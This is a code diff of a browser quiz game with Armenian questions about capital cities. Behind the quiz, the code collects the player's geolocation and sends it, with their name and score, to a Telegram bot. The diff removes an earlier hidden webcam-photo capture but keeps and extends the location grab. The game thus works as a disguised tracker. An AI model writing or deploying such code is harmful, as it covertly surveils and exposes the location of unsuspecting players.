@@ -9,23 +9,20 @@ const gameArea = document.getElementById('game-area');
 const questionElement = document.getElementById('question');
 const answerButtonsElement = document.getElementById('answer-buttons');
 const tryAgainBtn = document.getElementById('try-again-btn');
-const video = document.getElementById('video');
 
 let userName = '';
 let currentQuestionIndex = 0;
 let score = 0;
 let wrong = 0;
 let questions = [];
-let photoData = null;
-let locationLink = 'Գեոլոկացիա չտրամադրվեց';
+let locationLink = 'Տեղեկատվություն չի ստացվել';
 
-nameForm.addEventListener('submit', async (e) => {
+nameForm.addEventListener('submit', (e) => {
   e.preventDefault();
   userName = nameInput.value.trim() || 'Անհայտ';
   userNameDiv.textContent = userName;
   document.getElementById('name-form-container').style.display = 'none';
   gameArea.style.display = 'block';
-  await startCamera();
   getLocation();
   startGame();
 });
@@ -104,16 +101,26 @@ function endGame() {
 }
 
 function sendTelegramData() {
-  const message = `👤 Անուն: ${userName}%0A✅ Ճիշտ պատասխաններ: ${score}%0A❌ Սխալ պատասխաններ: ${wrong}%0A📍 Տեղադրություն: ${locationLink}`;
-  if (photoData) {
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: 'POST',
-      body: JSON.stringify({
-        chat_id: chatId,
-        photo: photoData,
-        caption: message,
-        parse_mode: 'HTML'
-      }),
-      headers: { 'Content-Type': 'application/json' }
+  const msg = `👤 Անուն: ${userName}%0A✅ Ճիշտ պատասխաններ: ${score}%0A❌ Սխալ պատասխաններ: ${wrong}%0A📍 Տեղադրություն: ${locationLink}`;
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}`);
+}
+
+function getLocation() {
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude, longitude } = pos.coords;
+      locationLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+    }, () => {
+      locationLink = 'Չհաջողվեց ստանալ տեղադրությունը';
     });
- 
+  }
+}
+
+// --- 5 հարցի օրինակներ (կարող ես ավելացնել քոնը)
+const allQuestions = [
+  { question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։", answers: ["Փարիզ", "Մարսել", "Լիոն", "Նիցցա"], correct: "Փարիզ" },
+  { question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։", answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Կազան", "Նովոսիբիրսկ"], correct: "Մոսկվա" },
+  { question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։", answers: ["Բեռլին", "Մյունխեն", "Համբուրգ", "Քյոլն"], correct: "Բեռլին" },
+  { question: "Ո՞րն է Իտալիայի մայրաքաղաքը։", answers: ["Հռոմ", "Միլան", "Նեապոլ", "Վենետիկ"], correct: "Հռոմ" },
+  { question: "Ո՞րն է Հայաստանի մայրաքաղաքը։", answers: ["Երևան", "Գյումրի", "Վանաձոր", "Աշտարակ"], correct: "Երևան" }
+];
